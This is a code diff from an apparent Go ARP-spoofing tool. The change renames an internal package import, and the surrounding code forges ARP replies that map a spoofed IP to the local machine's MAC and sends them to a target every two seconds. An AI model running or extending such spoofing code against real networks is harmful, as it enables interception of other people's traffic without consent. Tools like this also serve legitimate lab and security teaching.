@@ -8,12 +8,13 @@ import (
 	"os/signal"
 	"time"
 
-	"arp-spoofing/internal/arpapp"
+	"arp-spoofing/internal/app"
+
 	"github.com/mdlayher/arp"
 )
 
 // ARP Reply：spoofedIP 的 MAC 地址是本机 mac
-func writeGratuitousARP(client *arp.Client, spoofed, target arpapp.Endpoint) error {
+func writeGratuitousARP(client *arp.Client, spoofed, target app.Endpoint) error {
 	pkt, err := arp.NewPacket(
 		arp.OperationReply,
 		spoofed.MAC, // 发送者硬件地址
@@ -28,17 +29,17 @@ func writeGratuitousARP(client *arp.Client, spoofed, target arpapp.Endpoint) err
 }
 
 func run(ifname, targetIPStr, spoofedIPStr string) error {
-	iface, myIP, err := arpapp.GetInterface(ifname)
+	iface, myIP, err := app.GetInterface(ifname)
 	if err != nil {
 		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
 	}
 
-	targetIP, err := arpapp.ParseIPv4(targetIPStr)
+	targetIP, err := app.ParseIPv4(targetIPStr)
 	if err != nil {
 		return err
 	}
 
-	spoofedIP, err := arpapp.ParseIPv4(spoofedIPStr)
+	spoofedIP, err := app.ParseIPv4(spoofedIPStr)
 	if err != nil {
 		return err
 	}
@@ -65,8 +66,8 @@ func run(ifname, targetIPStr, spoofedIPStr string) error {
 	fmt.Println("[*] Sending gratuitous ARP every 2 seconds")
 	fmt.Println("[*] Press Ctrl+C to exit")
 
-	spoofed := arpapp.Endpoint{IP: spoofedIP, MAC: iface.HardwareAddr}
-	target := arpapp.Endpoint{IP: targetIP, MAC: targetMAC}
+	spoofed := app.Endpoint{IP: spoofedIP, MAC: iface.HardwareAddr}
+	target := app.Endpoint{IP: targetIP, MAC: targetMAC}
 	ticker := time.NewTicker(2 * time.Second)
 	defer ticker.Stop()
 
